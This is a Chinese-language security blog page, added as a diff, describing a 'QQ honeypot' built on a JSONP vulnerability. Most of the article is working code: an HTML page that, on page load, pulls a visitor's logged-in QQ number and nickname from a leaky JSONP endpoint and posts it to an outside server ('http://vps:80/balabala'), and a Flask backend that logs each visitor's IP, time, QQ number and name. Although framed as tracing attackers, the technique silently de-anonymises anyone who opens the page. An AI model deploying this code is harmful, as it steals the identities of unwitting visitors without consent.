@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>利用jsonp漏洞制作QQ蜜罐 | z0@ServSec</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="制作思路1.获得一个jsonp漏洞 2.当浏览器直接访问jsonp地址的时候可以回显出当前浏览器登录过qq邮箱的qq号和昵称 3.有callback函数可以回调 1.制作一个html当页面直接的时候，引入jq用来发送数据，数据使用post数据方式，将jsonp的请求结果发送到服务器 qq.html 12345678910111213141516171819202122232425262728293">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用jsonp漏洞制作QQ蜜罐">
+<meta property="og:url" content="https://z0edff0x3d.github.io/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/index.html">
+<meta property="og:site_name" content="z0@ServSec">
+<meta property="og:description" content="制作思路1.获得一个jsonp漏洞 2.当浏览器直接访问jsonp地址的时候可以回显出当前浏览器登录过qq邮箱的qq号和昵称 3.有callback函数可以回调 1.制作一个html当页面直接的时候，引入jq用来发送数据，数据使用post数据方式，将jsonp的请求结果发送到服务器 qq.html 12345678910111213141516171819202122232425262728293">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/image-20220714160001691.png">
+<meta property="article:published_time" content="2022-07-14T07:48:37.000Z">
+<meta property="article:modified_time" content="2022-07-14T08:00:42.346Z">
+<meta property="article:author" content="z0edff0x3d">
+<meta property="article:tag" content="安全开发">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z0edff0x3d.github.io/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/image-20220714160001691.png">
+  
+    <link rel="alternative" href="/atom.xml" title="z0@ServSec" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">z0edff0x3d</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Blog/" style="font-size: 10px;">Blog</a> <a href="/tags/GO/" style="font-size: 15px;">GO</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Mac/" style="font-size: 10px;">Mac</a> <a href="/tags/Python/" style="font-size: 17.5px;">Python</a> <a href="/tags/SBOM/" style="font-size: 10px;">SBOM</a> <a href="/tags/SCA/" style="font-size: 10px;">SCA</a> <a href="/tags/vCenter/" style="font-size: 12.5px;">vCenter</a> <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" style="font-size: 10px;">云原生</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 20px;">安全开发</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 12.5px;">渗透测试</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="/">以下排名不分先后</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://g0uz1.github.io/">g0uz1(大哥)</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a pentester.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-利用jsonp漏洞制作QQ蜜罐" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/" class="article-date">
+  	<time datetime="2022-07-14T07:48:37.000Z" itemprop="datePublished">2022-07-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用jsonp漏洞制作QQ蜜罐
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag">安全开发</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="制作思路"><a href="#制作思路" class="headerlink" title="制作思路"></a>制作思路</h2><p>1.获得一个jsonp漏洞</p>
+<p>2.当浏览器直接访问jsonp地址的时候可以回显出当前浏览器登录过qq邮箱的qq号和昵称</p>
+<p>3.有callback函数可以回调</p>
+<h3 id="1-制作一个html"><a href="#1-制作一个html" class="headerlink" title="1.制作一个html"></a>1.制作一个html</h3><p>当页面直接的时候，引入jq用来发送数据，数据使用post数据方式，将jsonp的请求结果发送到服务器</p>
+<p>qq.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;load()&quot;&gt;</span><br><span class="line">&lt;script src=&quot;jquery-1.11.1.min.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function load()</span><br><span class="line">&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">url: &quot;http://xxx.qq.com?id=1&amp;callback=jQuery12333&quot;,//这里是jsonp漏洞的地址</span><br><span class="line"></span><br><span class="line">type: &quot;GET&quot;,       //指定GET请求方法</span><br><span class="line"></span><br><span class="line">dataType: &quot;jsonp&quot;, //指定服务器返回的数据类型</span><br><span class="line"></span><br><span class="line">jsonp: &quot;callback&quot;, //指定参数名称</span><br><span class="line"></span><br><span class="line">jsonpCallback: &quot;jQuery12333&quot;,</span><br><span class="line"></span><br><span class="line">success: function (data) &#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">  type: &#x27;POST&#x27;,</span><br><span class="line">  url: &#x27;http://vps:80/balabala&#x27;,</span><br><span class="line">  </span><br><span class="line">  data: data</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-后端解析发送过来的请求"><a href="#2-后端解析发送过来的请求" class="headerlink" title="2.后端解析发送过来的请求"></a>2.后端解析发送过来的请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,request,jsonify,render_template,make_response</span><br><span class="line">import requests,hashlib</span><br><span class="line">from flask_cors import CORS</span><br><span class="line">import json</span><br><span class="line">import sqlite3</span><br><span class="line">import datetime</span><br><span class="line">import logging</span><br><span class="line">import logging.config</span><br><span class="line">import termcolor</span><br><span class="line"></span><br><span class="line">template_folder=&quot;templates&quot;</span><br><span class="line">static_folder=&quot;static&quot;</span><br><span class="line">static_url_path=&quot;&quot;</span><br><span class="line">app =Flask(__name__ ,template_folder=template_folder,static_folder=static_folder,static_url_path=static_url_path)</span><br><span class="line">cors =CORS(app,resource=&#123;r&quot;/*&quot;:&#123;&quot;origins&quot;:&quot;*&quot;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/index&quot;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def dongxing():</span><br><span class="line">    return render_template(&#x27;qq.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/balabala&quot;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def hello_world():</span><br><span class="line">    if request.method==&#x27;POST&#x27;:</span><br><span class="line">        host = str(request.remote_addr)</span><br><span class="line">        timestart = str(datetime.datetime.now().strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;))</span><br><span class="line">        qq=request.form[&#x27;B[data][rankinfo][uin]&#x27;]</span><br><span class="line">        name=request.form[&#x27;C[data][name]&#x27;]</span><br><span class="line">        print(&quot;======================&quot;)</span><br><span class="line">        print(host)</span><br><span class="line">        print(timestart)</span><br><span class="line">        print(qq)</span><br><span class="line">        print(name)</span><br><span class="line">        with open(&#x27;result.txt&#x27;,&#x27;a&#x27;) as f:</span><br><span class="line">            f.write(&quot;======================\n&quot;)</span><br><span class="line">            f.write(host+&quot;\n&quot;)</span><br><span class="line">            f.write(timestart+&quot;\n&quot;)</span><br><span class="line">            f.write(qq+&quot;\n&quot;)</span><br><span class="line">            f.write(name+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">    return &quot;&lt;p&gt;hello world&lt;/p&gt;\n&quot;</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(termcolor.colored(&#x27;Service Start....正在监听当前ip的5000端口&#x27;, &quot;green&quot;))</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-最终效果"><a href="#3-最终效果" class="headerlink" title="3.最终效果"></a>3.最终效果</h3><p>只要浏览器快速登陆过qq，如qq邮箱，在短时间内获取到qq号和昵称，在长时间内只能获取到qq号，其他漏洞应该原理也是差不多的，只要收集足够多的jsonp漏洞就可以溯源了~</p>
+<p><img src="/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/image-20220714160001691.png" alt="image-20220714160001691"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          搭建一个单master的k8s集群
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Docker容器逃逸方式总结</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 z0edff0x3d
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
